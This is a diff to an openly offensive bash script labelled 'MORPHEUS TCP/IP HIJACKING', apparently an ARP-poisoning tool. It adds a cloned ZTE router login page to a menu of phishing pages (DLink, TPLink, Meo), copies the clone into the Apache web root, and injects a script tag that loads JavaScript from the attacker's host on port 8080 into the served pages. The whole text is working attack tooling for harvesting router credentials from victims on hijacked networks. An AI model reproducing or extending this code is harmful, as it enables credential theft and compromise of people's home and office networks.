@@ -1742,7 +1742,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
 
 # chose what phishing webpage to use 
-PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem Info:\n$InjE\nLogin at: http://$GaTe\n\nChose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink (2015)" --width 350 --height 320) > /dev/null 2>&1
+PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem Info:\n$InjE\nLogin at: http://$GaTe\n\nChose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink" FALSE "ZTE" --width 350 --height 340) > /dev/null 2>&1
 
 
   # building cloned login modem webpage
@@ -1758,8 +1758,12 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem I
     cp -r DLINK $ApachE/DLINK > /dev/null 2>&1
   fi
   # chose 4 phishing webpage to use
-  if [ "$PHiS" = "TPLink (2015)" ]; then
+  if [ "$PHiS" = "TPLink" ]; then
     cp -r TPLink $ApachE/TPLink > /dev/null 2>&1
+  fi
+  # chose 5 phishing webpage to use
+  if [ "$PHiS" = "ZTE" ]; then
+    cp -r ZTE $ApachE/ZTE > /dev/null 2>&1
   fi
 
 
@@ -1776,8 +1780,10 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem I
     sed -i "s/MoDemIP/www.google.im/" login.html
   elif [ "$PHiS" = "Default" ]; then
     sed -i "s/MoDemIP/$MIP/" login.html
-  elif [ "$PHiS" = "TPLink (2015)" ]; then
+  elif [ "$PHiS" = "TPLink" ]; then
     :
+  elif [ "$PHiS" = "ZTE" ]; then
+    sed -i "s/MoDemIP/www.google.im/" login.html
   else
     sed -i "s/MoDemIP/$MIP/" login.html
   fi
@@ -1791,8 +1797,12 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem I
     cd DLINK
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
     cd ..
-  elif [ "$PHiS" = "TPLink (2015)" ]; then
+  elif [ "$PHiS" = "TPLink" ]; then
     cd TPLink
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
+  elif [ "$PHiS" = "ZTE" ]; then
+    cd ZTE
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
     cd ..
   else
@@ -1863,6 +1873,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   rm -r $ApachE/router-modem > /dev/null 2>&1
   rm -r $ApachE/DLINK > /dev/null 2>&1
   rm -r $ApachE/TPLink > /dev/null 2>&1
+  rm -r $ApachE/ZTE > /dev/null 2>&1
   # rm -r $IPATH/output/clone > /dev/null 2>&1
   cd $IPATH
 
